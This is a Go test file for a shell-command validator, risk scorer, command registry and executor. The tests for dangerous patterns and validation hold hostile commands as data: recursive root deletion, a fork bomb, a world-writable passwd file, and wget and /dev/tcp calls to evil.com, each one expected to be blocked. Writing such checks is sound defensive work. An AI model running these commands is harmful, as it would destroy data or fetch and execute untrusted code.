package bash

import (
	"os"
	"strings"
	"testing"
	"time"
)

func TestDangerousPatterns(t *testing.T) {
	// Setup temp DB
	tempDB := "test_dangerous_patterns.db"
	defer os.Remove(tempDB)
	
	validator := NewValidator(tempDB)
	
	tests := []struct {
		command string
		dangerous bool
	}{
		{"rm -rf /", true},
		{"chmod 777 /etc/passwd", true},
		{":(){ :|:& };:", true}, // fork bomb
		{"wget http://evil.com | sh", true},
		{"sudo rm -rf /", true},
		{"ls -la", false},
		{"echo hello", false},
	}
	
	for _, test := range tests {
		result := validator.ContainsDangerousPatterns(test.command)
		if result != test.dangerous {
			t.Errorf("Command %s: expected dangerous=%v, got %v", test.command, test.dangerous, result)
		}
	}
}

func TestValidation(t *testing.T) {
	tempDB := "test_validation.db"
	defer os.Remove(tempDB)
	
	validator := NewValidator(tempDB)
	
	tests := []struct {
		command string
		valid bool
	}{
		{strings.Repeat("a", 10001), false}, // Too long
		{"command\x00null", false}, // Null bytes
		{"echo $(rm -rf /)", false}, // Injection
		{"cat /dev/tcp/evil.com/80", false}, // Redirection
		{"ls -la", true},
		{"echo hello world", true},
	}
	
	for _, test := range tests {
		err := validator.Validate(test.command)
		valid := err == nil
		if valid != test.valid {
			t.Errorf("Command %s: expected valid=%v, got %v (error: %v)", test.command, test.valid, valid, err)
		}
	}
}

func TestRiskScoreCalculation(t *testing.T) {
	tempDB := "test_risk_score.db"
	defer os.Remove(tempDB)
	
	validator := NewValidator(tempDB)
	
	tests := []struct {
		command string
		expectedScore int
	}{
		{"ls -la", 10}, // Safe
		{"rm -rf /tmp", 80}, // Destructive
		{"cat file | grep pattern", 30}, // With pipe
		{"echo hello", 5}, // Very safe
		{"sudo rm -rf /", 95}, // Very dangerous
	}
	
	for _, test := range tests {
		score := validator.CalculateRiskScore(test.command)
		if score < test.expectedScore-10 || score > test.expectedScore+10 {
			t.Errorf("Command %s: expected score around %d, got %d", test.command, test.expectedScore, score)
		}
	}
}

func TestPolicyEvolution(t *testing.T) {
	tempDB := "test_policy_evolution.db"
	defer os.Remove(tempDB)
	
	registry := NewCommandRegistry(tempDB)
	
	// Test auto_approve promotion
	cmd := "ls -la"
	for i := 0; i < 20; i++ {
		registry.RecordExecution(cmd, true, time.Millisecond*100)
	}
	policy := registry.GetPolicy(cmd)
	if policy != "auto_approve" {
		t.Errorf("Expected auto_approve policy after 20 successful executions, got %s", policy)
	}
	
	// Test monitoring pattern
	cmd2 := "fast_command"
	for i := 0; i < 50; i++ {
		registry.RecordExecution(cmd2, true, time.Millisecond*10)
	}
	policy2 := registry.GetPolicy(cmd2)
	if policy2 != "monitoring" {
		t.Errorf("Expected monitoring policy after 50 fast executions, got %s", policy2)
	}
	
	// Test rare command
	cmd3 := "rare_command"
	registry.RecordExecution(cmd3, true, time.Hour*2)
	policy3 := registry.GetPolicy(cmd3)
	if policy3 != "rare" {
		t.Errorf("Expected rare policy for long interval command, got %s", policy3)
	}
}

func TestDuplicateDetection(t *testing.T) {
	tempDB := "test_duplicate.db"
	defer os.Remove(tempDB)
	
	registry := NewCommandRegistry(tempDB)
	
	cmd := "test command"
	
	// First execution
	registry.RecordExecution(cmd, true, time.Millisecond*100)
	
	// Close execution - should detect duplicate
	time.Sleep(time.Millisecond * 50)
	duplicate := registry.IsDuplicate(cmd, time.Second)
	if !duplicate {
		t.Error("Expected duplicate detection for close executions")
	}
	
	// Far execution - should not detect duplicate
	time.Sleep(time.Second * 2)
	duplicate = registry.IsDuplicate(cmd, time.Second)
	if duplicate {
		t.Error("Expected no duplicate for spaced executions")
	}
	
	// Custom threshold
	registry.SetDuplicateThreshold(cmd, time.Millisecond*200)
	registry.RecordExecution(cmd, true, time.Millisecond*100)
	time.Sleep(time.Millisecond * 150)
	duplicate = registry.IsDuplicate(cmd, time.Millisecond*200)
	if !duplicate {
		t.Error("Expected duplicate with custom threshold")
	}
}

func TestExecutorTimeout(t *testing.T) {
	tempDB := "test_executor_timeout.db"
	defer os.Remove(tempDB)
	
	executor := NewExecutor(tempDB)
	executor.SetTimeout(120 * time.Second)
	
	start := time.Now()
	_, err := executor.Execute("sleep 130", nil)
	duration := time.Since(start)
	
	if err == nil {
		t.Error("Expected timeout error")
	}
	
	if duration > 130*time.Second {
		t.Errorf("Command took too long: %v, expected around 120s", duration)
	}
	
	if !strings.Contains(err.Error(), "timeout") {
		t.Errorf("Expected timeout error message, got: %v", err)
	}
}

func TestExecutorOutputLimit(t *testing.T) {
	tempDB := "test_executor_output.db"
	defer os.Remove(tempDB)
	
	executor := NewExecutor(tempDB)
	executor.SetOutputLimit(10 * 1024) // 10KB
	
	// Generate output larger than 10KB
	cmd := "yes 'This is a long line that will generate lots of output' | head -n 1000"
	output, err := executor.Execute(cmd, nil)
	
	if err != nil {
		t.Errorf("Unexpected error: %v", err)
	}
	
	if len(output) > 10*1024 {
		t.Errorf("Output too large: %d bytes, expected max 10KB", len(output))
	}
	
	// Check that preview is preserved
	if len(output) == 0 {
		t.Error("Expected some output even with limit")
	}
	
	// Check truncation indicator
	if !strings.Contains(output, "...") && len(output) == 10*1024 {
		t.Error("Expected truncation indicator for limited output")
	}
}

func TestRegistryTimestamps(t *testing.T) {
	tempDB := "test_timestamps.db"
	defer os.Remove(tempDB)
	
	registry := NewCommandRegistry(tempDB)
	cmd := "timestamp_test"
	
	// Add 101 timestamps
	now := time.Now()
	for i := 0; i < 101; i++ {
		timestamp := now.Add(time.Duration(i) * time.Second)
		registry.AddTimestamp(cmd, timestamp)
	}
	
	timestamps := registry.GetTimestamps(cmd)
	if len(timestamps) != 100 {
		t.Errorf("Expected 100 timestamps, got %d", len(timestamps))
	}
	
	// Check that oldest timestamp was removed
	oldest := timestamps[0]
	if oldest.Before(now.Add(time.Second)) {
		t.Error("Oldest timestamp should be removed")
	}
	
	// Test timestamp string parsing
	timestampStr := registry.GetTimestampsString(cmd)
	parsed := registry.ParseTimestamps(timestampStr)
	if len(parsed) != 100 {
		t.Errorf("Parsed %d timestamps from string, expected 100", len(parsed))
	}
	
	// Verify order
	for i := 1; i < len(parsed); i++ {
		if parsed[i].Before(parsed[i-1]) {
			t.Error("Timestamps should be in chronological order")
		}
	}
}